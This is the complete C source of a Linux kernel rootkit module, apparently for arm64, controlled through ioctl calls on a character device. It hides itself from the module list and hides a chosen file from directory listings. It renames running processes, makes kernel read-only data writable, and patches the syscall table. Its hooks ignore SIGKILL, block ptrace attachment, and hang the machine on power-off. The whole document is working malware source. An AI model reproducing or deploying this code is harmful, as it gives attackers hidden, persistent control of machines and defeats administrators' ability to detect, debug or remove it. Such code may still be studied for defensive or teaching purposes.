#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/kprobes.h>
#include <asm/syscall.h>
#include <asm/unistd.h>
#include <linux/delay.h>
#include <linux/ptrace.h>

#include "rootkit.h"

#define OURMODNAME "rootkit"
#define ROOTKIT_DEV_NAME "rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;

/* hide the module*/
static bool is_hidden;
static struct list_head *previous_module;

/* hide the file */
static struct hided_file hided_file;

/* syscall hook */
static bool is_hooked;
static syscall_fn_t *syscall_table;
static syscall_fn_t orig_kill;
static syscall_fn_t orig_getdents64;
static syscall_fn_t orig_reboot;
static syscall_fn_t orig_ptrace;

static void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
static unsigned long (*lookup_name)(const char *name);

/* Abuse kprobe to get the address of kallsyms_lookup_name */
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

static int rootkit_open(struct inode *inode, struct file *filp)
{
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	return 0;
}

static void rootkit_hide_module(void)
{
	if (is_hidden) {
		/* Show the module */
		is_hidden = false;
		list_add(&THIS_MODULE->list, previous_module);
	} else {
		/* Hide the module */
		is_hidden = true;
		previous_module = THIS_MODULE->list.prev;
		list_del_init(&THIS_MODULE->list);
	}
}

static long rootkit_masq_proc(unsigned long arg)
{
	struct masq_proc_req req;
	size_t i;
	struct task_struct *task;
	struct masq_proc *masq_lst;


	if (copy_from_user(&req, (void *)arg, sizeof(req)))
		return -EFAULT;

	masq_lst = kmalloc_array(req.len, sizeof(struct masq_proc), GFP_KERNEL);
	if (!masq_lst)
		return -ENOMEM;

	if (copy_from_user(masq_lst, req.list, req.len * sizeof(struct masq_proc))) {
		kfree(masq_lst);
		return -EFAULT;
	}

	/* Make sure the strings are ended with '\0' */
	for (i = 0; i < req.len; i++) {
		masq_lst[i].new_name[MASQ_LEN - 1] = '\0';
		masq_lst[i].orig_name[MASQ_LEN - 1] = '\0';
	}

	for_each_process(task) {
		for (i = 0; i < req.len; i++) {
			if (strlen(masq_lst[i].new_name) >= strlen(masq_lst[i].orig_name))
				continue;
			if (strncmp(task->comm, masq_lst[i].orig_name, TASK_COMM_LEN) == 0) {
				strncpy(task->comm, masq_lst[i].new_name, TASK_COMM_LEN);
				task->comm[TASK_COMM_LEN - 1] = '\0';
				break;
			}
		}
	}
	return 0;
}

static long rootkit_hide_file(unsigned long arg)
{
	if (copy_from_user(&hided_file, (void *)arg, sizeof(hided_file)))
		return -EFAULT;

	hided_file.name[NAME_LEN - 1] = '\0';
	return 0;
}

// Reference: https://elixir.bootlin.com/linux/v5.15/source/arch/arm64/mm/mmu.c#L558
static int mark_rodata_rw(void)
{
	unsigned long section_size, __init_begin, __start_rodata;

	__init_begin = lookup_name("__init_begin");
	__start_rodata = lookup_name("__start_rodata");

	if (!__init_begin || !__start_rodata) {
		printk(KERN_ERR "Failed to find __init_begin or __start_rodata\n");
		return -EINVAL;
	}

	section_size = (unsigned long)__init_begin - (unsigned long)__start_rodata;
	update_mapping_prot(__pa_symbol(__start_rodata), (unsigned long)__start_rodata,
			    section_size, PAGE_KERNEL);

	return 0;
}

static long rootkit_ptrace(const struct pt_regs *regs)
{
	/* Prevent ptrace processes, but allow to trace already traced process */
	if (regs->regs[0] == PTRACE_TRACEME || regs->regs[0] == PTRACE_ATTACH
		|| regs->regs[0] == PTRACE_SEIZE)
		return -EPERM;
	return orig_ptrace(regs);
}

static long rootkit_kill(const struct pt_regs *regs)
{

	if (regs->regs[1] == 9) {
		return 0; /* ignore SIGKILL */
	}
	return orig_kill(regs);
}

static long rootkit_reboot(const struct pt_regs *regs)
{
	#define LINUX_REBOOT_CMD_POWER_OFF 0x4321fedc
	#define LINUX_REBOOT_CMD_HALT 0xcdef0123
	if (regs->regs[2] == LINUX_REBOOT_CMD_POWER_OFF) {
		while (1) {
			mdelay(10000); // stuck here
		}
	} else {
		return orig_reboot(regs);
	}
}

static long rootkit_getdent64(const struct pt_regs *regs)
{
	long ret, reclen;
	void *user_buf = (char *)regs->regs[1];
	char *buf;
	unsigned long off = 0;
	struct linux_dirent64 *dirent;

	ret = orig_getdents64(regs);
	if (ret < 0)
		return ret;

	buf = kmalloc(ret, GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	if (copy_from_user(buf, user_buf, ret)) {
		kfree(buf);
		return -EFAULT;
	}

	for (off = 0; off < ret; off += reclen) {
		dirent = (struct linux_dirent64 *)(buf + off);
		reclen = dirent->d_reclen;
		buf[off + reclen] = '\0';

		if (strcmp(dirent->d_name, hided_file.name) == 0) {
			memmove(buf + off, buf + off + reclen, ret - off - reclen);
			ret -= reclen;
			reclen = dirent->d_reclen;
		}
	}

	if (copy_to_user(user_buf, buf, ret)) {
		kfree(buf);
		return -EFAULT;
	}

	kfree(buf);
	return ret;
}

static long rootkit_hook_syscall(unsigned long arg)
{

	if (is_hooked)
		return 0;

	/* Find original addresses */
	orig_kill = syscall_table[__NR_kill];
	orig_getdents64 = syscall_table[__NR_getdents64];
	orig_reboot = syscall_table[__NR_reboot];
	orig_ptrace = syscall_table[__NR_ptrace];

	/* Hook kill */
	syscall_table[__NR_kill] = rootkit_kill;
	syscall_table[__NR_reboot] = rootkit_reboot;
	syscall_table[__NR_getdents64] = rootkit_getdent64;
	syscall_table[__NR_ptrace] = rootkit_ptrace;

	is_hooked = true;
	return 0;
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
			  unsigned long arg)
{
	int ret = 0;

	switch (ioctl) {
		case IOCTL_MOD_HOOK:
			ret = rootkit_hook_syscall(arg);
			break;
		case IOCTL_MOD_HIDE:
			rootkit_hide_module();
			break;
		case IOCTL_MOD_MASQ:
			ret = rootkit_masq_proc(arg);
			break;
		case IOCTL_FILE_HIDE:
			ret = rootkit_hide_file(arg);
			break;
		default:
			ret = -EINVAL;
	}
	return ret;
}

struct file_operations fops = {
	.open = rootkit_open,
	.unlocked_ioctl = rootkit_ioctl,
	.release = rootkit_release,
	.owner = THIS_MODULE
};

static int rootkit_fillin_addresses(void)
{
	int ret;

	ret = register_kprobe(&kp);
	if (ret < 0)
		return ret;
	lookup_name = (void *)kp.addr;
	unregister_kprobe(&kp);
	if (!lookup_name)
		return -EINVAL;

	update_mapping_prot = (void *)lookup_name("update_mapping_prot");
	if (!update_mapping_prot)
		return -EINVAL;

	/* Mark .rodata as writable */
	if (mark_rodata_rw() < 0)
		return -EINVAL;

	/* Find syscall table */
	syscall_table = (syscall_fn_t *)lookup_name("sys_call_table");
	if (!syscall_table)
		return -EINVAL;

	return 0;
}

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	if (rootkit_fillin_addresses() < 0)
		return -EINVAL;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	printk("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info("unable to allocate cdev");
		return ret;
	}

	return 0;
}

static void __exit rootkit_exit(void)
{
	// Unhide the module
	if (is_hidden) {
		rootkit_hide_module();
		is_hidden = false;
	}

	// unhook syscall
	if (is_hooked) {
		syscall_table[__NR_kill] = orig_kill;
		syscall_table[__NR_getdents64] = orig_getdents64;
		syscall_table[__NR_reboot] = orig_reboot;
		syscall_table[__NR_ptrace] = orig_ptrace;
		is_hooked = false;
	}
	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
